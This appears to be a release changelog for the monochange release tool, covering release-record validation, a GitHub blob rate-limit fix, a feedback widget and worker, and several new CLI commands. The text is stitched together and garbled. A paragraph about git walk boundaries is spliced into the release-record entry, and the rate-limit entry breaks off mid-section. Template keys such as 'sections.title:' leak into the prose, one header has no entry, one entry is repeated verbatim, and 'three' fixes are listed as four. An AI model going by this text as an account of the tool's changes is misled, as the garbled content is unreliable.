_Packages:_ 🟢 _monochange_

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #850](https://github.com/monochange/monochange/pull/850)

Reject modified release records before `CommitRelease`, even when their target IDs and versions still match the prepared release. Rejected records leave overlapping release records untouched. If the expected record cannot be serialized, validation reports the cause before writing.

Previously, `monochange step commit-release` could accept a record with matching targets but modified release instructions. It now reports a content mismatch. `PrepareRelease` preserves existing records. Changing the producer command also requires restoring the expected record from trusted preparation or explicitly enabling `update_release_json` repair. A commit whose first parent never appears in the walk sits at a cut boundary (the root, or a shallow clone), and only those fall back to a full tree listing — the same fallback the per-commit probes used to select, decided from the single walk instead of extra git calls. Each non-boundary commit now costs one `git diff-tree` instead of the previous four to six processes, so finding a record hundreds of commits back stops spawning thousands of git processes.

### 🐛 Fixed

#### Build hosted release trees without tripping GitHub's secondary rate limit

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #861](https://github.com/monochange/monochange/pull/861)

Large hosted releases no longer fail. `monochange run release --commit --create-pr` with `MONOCHANGE_RELEASE_BACKEND=hosted` used to upload one `POST /git/blobs` request per release file. A release touching a hundred crate changelogs plus manifests and lockfiles exceeded GitHub's secondary rate limit for content creation, which is about 80 content-creating requests per minute. entries:
#### Install feedback on any website

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #860](https://github.com/monochange/monochange/pull/860)

The first release provides `FeedbackClient` for headless integrations and `mountFeedback` for an accessible Shadow DOM widget. Users can discuss a request, find similar requests, upvote, submit, and follow delivery updates without a GitHub account.

```ts
import { mountFeedback } from "@monochange/feedback";

const feedback = mountFeedback({
	endpoint: "https://monochange.dev",
	project: 123,
	getClientToken: async () => (await fetch("/api/feedback-session")).json(),
	getContext: () => ({ route: location.pathname }),
});
```

Issue short-lived feedback sessions through your authenticated backend. Call `feedback.reset()` on logout or account changes. Backend credentials must never be embedded in client code. Submission retries keep the same idempotency key.

For a feedback page embedded inside an iframe, use `presentation: "inline"`. The form fills its container, omits the floating launcher and close button, and appears without a modal backdrop or automatic focus. Explicit `open()`, `close()`, and account-reset behavior remain available.

#### Run a connected feedback agent locally or on your own server

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #860](https://github.com/monochange/monochange/pull/860)

The first release adds `monochange-feedback-worker pair CONFIG.json` and `monochange-feedback-worker run CONFIG.json`. Pair through the project's feedback console using a single-use code, map permitted repositories to local checkouts, and configure the model endpoint and a preinstalled Docker or Podman check image.

```sh
monochange-feedback-worker pair .monochange/local/worker.json
monochange-feedback-worker run .monochange/local/worker.json
```

Planning reads a pinned export of the selected repository. After maintainer approval, implementation may change only the approved files, runs operator-configured checks in a container with no network or host credentials, and returns text changes for a draft pull request. Model credentials stay in the worker's process environment. Results are saved locally before submission so reconnecting can reconcile an interrupted response without repeating the agent run.

The worker has no merge or publishing operation. Keep its configuration and pending result file under `.monochange/local/` and revoke its credential in the console when disconnecting the machine.

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #860](https://github.com/monochange/monochange/pull/860)

sections.title: 🚀 Feature
entries:
#### Add `monochange completions` and `monochange doctor`

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #840](https://github.com/monochange/monochange/pull/840)

Two new commands close the two most common first-hour gaps:

- `monochange completions <bash|zsh|fish|elvish|powershell>` prints a shell completion script. The script is generated from the commands the current repository's `monochange.toml` defines, so config-defined workflows complete alongside the built-ins. Install it with your shell's completion mechanism, for example `monochange completions zsh > "${fpath[1]}/_monochange"`.
- `monochange doctor` checks the local environment in one place: git availability, `monochange.toml` parsing, and the toolchain behind every ecosystem enabled in the workspace (`cargo`, `node`, `deno`, `dart`, `python3`, `go`, `swift`, `pod`, `gradle`). Each check reports the tool's version or how to install it, with `--format json` for tooling. Checks are local only — nothing contacts the network.

sections.title: 🐛 Fixed
entries:
#### Preview `check --fix`, print init next steps, and retire `monochange populate`

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #857](https://github.com/monochange/monochange/pull/857)

Three usability fixes:

- `monochange check --fix --dry-run` previews the fixes `--fix` would apply without writing any file. The summary says `would fix N files`, and the check still fails when errors remain on disk, so a dry run never silently passes a workspace that fixing would repair. `--dry-run` now requires `--fix`.
- `monochange init` prints the next commands to run (validate, discover, create, preview) instead of only naming the file it wrote.
- The legacy `monochange populate` command is removed. It has been a documented no-op since the default workflow set became empty; scripts calling it now get an unknown-command error and should call the steps they need directly.
- TOML syntax errors in `monochange.toml` render with the same source snippet semantic errors get: file, line and column, the offending line with a caret, and the parser's reason, instead of a flat `failed to parse` message.

#### Honor ecosystems discovery settings and accept forgejo for init

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #857](https://github.com/monochange/monochange/pull/857)

`[ecosystems.<id>]` discovery settings now shape `monochange discover` and the release paths built on it:

- `enabled = false` skips that ecosystem entirely.
- `roots = ["crates", "packages"]` restricts discovery to packages whose manifests live under the listed directories.
- `exclude = ["tools/**"]` removes packages whose manifests match any glob. A glob that fails to compile warns once and matches nothing instead of silently dropping the filter.

Previously these fields were parsed but discovery scanned every supported ecosystem regardless. `monochange init --provider` also accepts `forgejo` alongside `github`, `gitlab`, and `gitea`.

#### Add canonical `monochange format` command

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #854](https://github.com/monochange/monochange/pull/854)

Adds `monochange format` to rewrite `monochange.toml` in the idiomatic layout: top-level sections in a fixed order, `[package.*]` and `[group.*]` tables sorted by id, group members sorted alphabetically, and `[cli.*]` workflows last. Comments stay attached to their tables and the document header stays at the top.

The command formats the result with taplo using the repository's tab-based, 100-column configuration, so it does not require a separate taplo installation. Use `monochange format --check` to fail CI when the file needs formatting without writing changes. The repository's `lint:monochange` task and CI lint job now run that check.

#### Add canonical `monochange format` command

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #854](https://github.com/monochange/monochange/pull/854)

Adds `monochange format` to rewrite `monochange.toml` in the idiomatic layout: top-level sections in a fixed order, `[package.*]` and `[group.*]` tables sorted by id, group members sorted alphabetically, and `[cli.*]` workflows last. Comments stay attached to their tables and the document header stays at the top.

The command formats the result with taplo using the repository's tab-based, 100-column configuration, so it does not require a separate taplo installation. Use `monochange format --check` to fail CI when the file needs formatting without writing changes. The repository's `lint:monochange` task and CI lint job now run that check.
